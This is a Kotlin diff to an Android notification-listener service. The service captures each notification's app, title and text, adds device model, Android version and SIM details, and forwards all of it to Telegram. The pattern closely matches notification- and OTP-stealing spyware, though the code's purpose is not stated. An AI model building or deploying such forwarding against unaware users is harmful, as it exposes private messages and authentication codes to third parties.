@@ -14,13 +14,25 @@ class NotificationService : NotificationListenerService() {
         val text = extras.getCharSequence("android.text")?.toString() ?: ""
         val bigText = extras.getCharSequence("android.bigText")?.toString() ?: text
 
+        val appLabel = DeviceInfo.appLabel(this, packageName)
+        val device = DeviceInfo.deviceLabel()
+        val android = DeviceInfo.androidVersion()
+        val simBlock = DeviceInfo.formatSims(this)
+
         val content = buildString {
-            appendLine("📱 $packageName")
-            appendLine("Title: $title")
-            appendLine("Body: $bigText")
+            appendLine("📱 <b>$device</b>")
+            appendLine("🤖 $android")
+            appendLine(simBlock)
+            appendLine("──────────────")
+            appendLine("📦 <b>$appLabel</b> ($packageName)")
+            if (title.isNotBlank()) appendLine("📝 <b>${escapeHtml(title)}</b>")
+            if (bigText.isNotBlank()) appendLine(escapeHtml(bigText))
         }
 
         Log.d("NotificationService", content)
         TelegramSender.send(this, content)
     }
+
+    private fun escapeHtml(s: String): String =
+        s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 }
